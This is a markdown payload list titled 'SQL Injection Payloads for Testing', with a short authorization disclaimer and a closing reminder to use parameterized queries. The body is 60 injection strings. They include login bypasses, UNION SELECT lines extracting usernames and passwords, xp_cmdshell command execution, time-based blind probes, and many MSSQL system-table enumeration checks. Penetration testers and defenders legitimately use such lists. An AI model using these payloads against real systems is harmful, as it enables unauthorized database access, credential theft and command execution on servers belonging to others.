# SQL Injection Payloads for Testing

This document contains a list of SQL Injection payloads designed for testing and securing your application against SQL Injection vulnerabilities. Ensure you have proper authorization before using these payloads on any application.

## Disclaimer

These payloads are provided for educational and testing purposes only. Misuse of this information can result in criminal penalties. Use these payloads responsibly and ethically.

## Payloads

1. `' OR '1'='1`
2. `' OR '1'='1' --`
3. `' OR 1=1--`
4. `1' OR '1'='1' /*`
5. `') OR ('1'='1--`
6. `' OR 1=1#`
7. `' OR 1=1/*`
8. `') OR '1'='1'--`
9. `'; EXEC xp_cmdshell('dir')--`
10. `' UNION SELECT 1, @@version--`
11. `' UNION SELECT null, username || '~' || password FROM users--`
12. `1'1`
13. `' AND '1'='1' --`
14. `' AND '1'='2`
15. `admin' --`
16. `admin' #`
17. `admin'/*`
18. `' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%')--`
19. `' UNION SELECT 1, table_name FROM information_schema.tables--`
20. `' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 'users'--`
21. `'||pg_sleep(10)--`
22. `'; WAITFOR DELAY '00:00:10'--`
23. `' AND ASCII(SUBSTRING((SELECT @@version), 1, 1)) > 52--`
24. `' AND (SELECT COUNT(*) FROM users) > 5--`
25. `' AND (SELECT user) = 'dbo'--`
26. `' AND 1=(SELECT COUNT(*) FROM tablenames);--`
27. `' AND 1 IN (SELECT MIN(name) FROM sysobjects WHERE xtype = 'U' AND name > '.')--`
28. `' AND 1=CAST('test' AS INT)--`
29. `' AND 1=CONVERT(INT, (SELECT @@version))--`
30. `' AND 1=(SELECT IS_SRVROLEMEMBER('sysadmin'))--`
31. `' AND (SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename') AND colid = 1) = 'columnname'--`
32. `' AND 1=DB_ID('master')--`
33. `' AND 1=(SELECT TOP 1 1 FROM [table] WHERE [column] LIKE '%')--`
34. `' AND 1=(SELECT COUNT(*) FROM master..sysdatabases WHERE dbid > 4)--`
35. `' AND (SELECT name FROM master..sysdatabases WHERE dbid = (SELECT MIN(dbid) FROM master..sysdatabases WHERE dbid > 4)) = 'tempdb'--`
36. `' AND 1=(SELECT IS_MEMBER('db_owner'))--`
37. `' AND 1=(SELECT IS_SRVROLEMEMBER('public'))--`
38. `' AND 1=(SELECT COUNT(*) FROM sysusers)--`
39. `' AND 1=(SELECT COUNT(*) FROM sysobjects WHERE xtype = 'U')--`
40. `' AND 1=(SELECT COUNT(*) FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE xtype = 'U' AND name = 'tablename'))--`
41. `' AND 1=(SELECT COUNT(*) FROM syscomments)--`
42. `' AND 1=(SELECT COUNT(*) FROM sysdepends)--`
43. `' AND 1=(SELECT COUNT(*) FROM sysfiles)--`
44. `' AND 1=(SELECT COUNT(*) FROM sysfiles1)--`
45. `' AND 1=(SELECT COUNT(*) FROM sysforeignkeys)--`
46. `' AND 1=(SELECT COUNT(*) FROM sysfulltextcatalogs)--`
47. `' AND 1=(SELECT COUNT(*) FROM sysindexes)--`
48. `' AND 1=(SELECT COUNT(*) FROM sysindexkeys)--`
49. `' AND 1=(SELECT COUNT(*) FROM sysmembers)--`
50. `' AND 1=(SELECT COUNT(*) FROM sysobjects)--`
51. `' AND 1=(SELECT COUNT(*) FROM syspermissions)--`
52. `' AND 1=(SELECT COUNT(*) FROM sysprotects)--`
53. `' AND 1=(SELECT COUNT(*) FROM sysreferences)--`
54. `' AND 1=(SELECT COUNT(*) FROM systypes)--`
55. `' AND 1=(SELECT COUNT(*) FROM sysusers)--`
56. `' AND 1=(SELECT COUNT(*) FROM sysxlogins)--`
57. `' AND 1=(SELECT COUNT(*) FROM sysxtypes)--`
58. `' AND 1=(SELECT COUNT(*) FROM syslanguages)--`
59. `' AND 1=(SELECT COUNT(*) FROM syslockinfo)--`
60. `' AND 1=(SELECT COUNT(*) FROM sysconstraints)--`

## Conclusion

Always review and sanitize user inputs in your applications to prevent SQL Injection attacks. Use parameterized queries, prepared statements, or ORM frameworks to handle data safely.